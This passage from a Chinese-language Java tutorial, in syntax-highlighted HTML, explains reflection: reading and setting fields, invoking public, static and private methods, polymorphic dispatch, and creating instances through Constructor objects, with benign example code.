class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"Xiao Ming\"</span>\n        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Field</span> f <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        f<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        f<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Xiao Hong\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"Xiao Hong\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码，打印的<code>name</code>字段从<code>Xiao Ming</code>变成了<code>Xiao Hong</code>，说明通过反射可以直接修改字段的值。</p>\n<p>同样的，修改非<code>public</code>字段，需要首先调用<code>setAccessible(true)</code>。</p>\n<h3>重点</h3>\n<ul>\n<li>\n<p>Java的反射API提供的<code>Field</code>类封装了字段的所有信息：</p>\n</li>\n<li>\n<p>通过<code>Class</code>实例的方法可以获取<code>Field</code>实例：<code>getField()</code>，<code>getFields()</code>，<code>getDeclaredField()</code>，<code>getDeclaredFields()</code>；</p>\n</li>\n<li>\n<p>通过Field实例可以获取字段信息：<code>getName()</code>，<code>getType()</code>，<code>getModifiers()</code>；</p>\n</li>\n<li>\n<p>通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用<code>setAccessible(true)</code>来访问非<code>public</code>字段。</p>\n</li>\n<li>\n<p>通过反射读写字段是一种非常规方法，它会破坏对象的封装。</p>\n</li>\n</ul>\n<h2>调用方法</h2>\n<p>我们已经能通过<code>Class</code>实例获取所有<code>Field</code>对象，同样的，可以通过<code>Class</code>实例获取所有<code>Method</code>信息。<code>Class</code>类提供了以下几个方法来获取<code>Method</code>：</p>\n<ul>\n<li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li>\n<li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li>\n<li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li>\n<li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li>\n</ul>\n<p>我们来看一下示例代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span> stdClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取public方法getScore，参数为String:</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stdClass<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getScore\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取继承的public方法getName，无参数:</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stdClass<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取private方法getGrade，参数为int:</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stdClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getGrade\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getScore</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> type<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">99</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> <span class=\"token function\">getGrade</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> year<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Person\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述代码首先获取<code>Student</code>的<code>Class</code>实例，然后，分别获取<code>public</code>方法、继承的<code>public</code>方法以及<code>private</code>方法，打印出的<code>Method</code>类似：</p>\n<div class=\"language-plain\" data-ext=\"plain\" data-title=\"plain\"><pre class=\"language-plain\"><code>public int Student.getScore(java.lang.String)\npublic java.lang.String Person.getName()\nprivate int Student.getGrade(int)\n</code></pre></div><p>一个<code>Method</code>对象包含一个方法的所有信息：</p>\n<ul>\n<li><code>getName()</code>：返回方法名称，例如：<code>\"getScore\"</code>；</li>\n<li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：<code>String.class</code>；</li>\n<li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：<code>{String.class, int.class}</code>；</li>\n<li><code>getModifiers()</code>：返回方法的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li>\n</ul>\n<h3>调用方法</h3>\n<p>当我们获取到一个<code>Method</code>对象时，就可以对它进行调用。我们以下面的代码为例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello world\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> r <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"world\"</span>\n</code></pre></div><p>如果用反射来调用<code>substring</code>方法，需要以下代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// String对象:</span>\n        <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello world\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取String substring(int)方法，参数为int:</span>\n        <span class=\"token class-name\">Method</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"substring\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 在s对象上调用该方法并获取结果:</span>\n        <span class=\"token class-name\">String</span> r <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 打印调用结果:</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"world\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注意到<code>substring()</code>有两个重载方法，我们获取的是<code>String substring(int)</code>这个方法。思考一下如何获取<code>String substring(int, int)</code>方法。</p>\n<p>对<code>Method</code>实例调用<code>invoke</code>就相当于调用该方法，<code>invoke</code>的第一个参数是对象实例，即在哪个实例上调用该方法，后面的可变参数要与方法参数一致，否则将报错。</p>\n<h3>调用静态方法</h3>\n<p>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以<code>invoke</code>方法传入的第一个参数永远为<code>null</code>。我们以<code>Integer.parseInt(String)</code>为例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 获取Integer.parseInt(String)方法，参数为String:</span>\n        <span class=\"token class-name\">Method</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"parseInt\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 调用该静态方法并获取结果:</span>\n        <span class=\"token class-name\">Integer</span> n <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">)</span> m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"12345\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 打印调用结果:</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>调用非public方法</h3>\n<p>和Field类似，对于非public方法，我们虽然可以通过<code>Class.getDeclaredMethod()</code>获取该方法实例，但直接对其调用将得到一个<code>IllegalAccessException</code>。为了调用非public方法，我们通过<code>Method.setAccessible(true)</code>允许其调用：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Method</span> m <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setName\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        m<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Bob\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>此外，<code>setAccessible(true)</code>可能会失败。如果JVM运行期存在<code>SecurityManager</code>，那么它会根据规则进行检查，有可能阻止<code>setAccessible(true)</code>。例如，某个<code>SecurityManager</code>可能不允许对<code>java</code>和<code>javax</code>开头的<code>package</code>的类调用<code>setAccessible(true)</code>，这样可以保证JVM核心库的安全。</p>\n<h3>多态</h3>\n<p>我们来考察这样一种情况：一个<code>Person</code>类定义了<code>hello()</code>方法，并且它的子类<code>Student</code>也覆写了<code>hello()</code>方法，那么，从<code>Person.class</code>获取的<code>Method</code>，作用于<code>Student</code>实例时，调用的方法到底是哪个？</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Method</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 获取Person的hello方法:</span>\n        <span class=\"token class-name\">Method</span> h <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 对Student实例调用hello方法:</span>\n        h<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Person:hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Student:hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>运行上述代码，发现打印出的是<code>Student:hello</code>，因此，使用反射调用方法时，仍然遵循多态原则：即总是调用实际类型的覆写方法（如果存在）。上述的反射代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Method</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nm<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>实际上相当于：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><h2>调用构造方法</h2>\n<p>我们通常使用<code>new</code>操作符创建新的实例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>调用<code>Class.newInstance()</code>的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过<code>Class.newInstance()</code>来调用。</p>\n<p>为了调用任意的构造方法，Java的反射API提供了<code>Constructor</code>对象，它包含一个构造方法的所有信息，可以创建一个实例。<code>Constructor</code>对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Constructor</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 获取构造方法Integer(int):</span>\n        <span class=\"token class-name\">Constructor</span> cons1 <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 调用构造方法:</span>\n        <span class=\"token class-name\">Integer</span> n1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">)</span> cons1<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>n1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// 获取构造方法Integer(String)</span>\n        <span class=\"token class-name\">Constructor</span> cons2 <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Integer</span> n2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">)</span> cons2<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"456\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>n2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>通过Class实例获取Constructor的方法如下：</p>\n<ul>\n<li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li>\n<li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li>\n<li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li>\n<li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li>\n</ul>\n<p>注意<code>Constructor</code>总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。</p>\n<p>调用非<code>public</code>的<code>Constructor</code>时，必须首先通过<code>setAccessible(true)</code>设置允许访问。<code>setAccessible(true)</code>可能会失败。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token 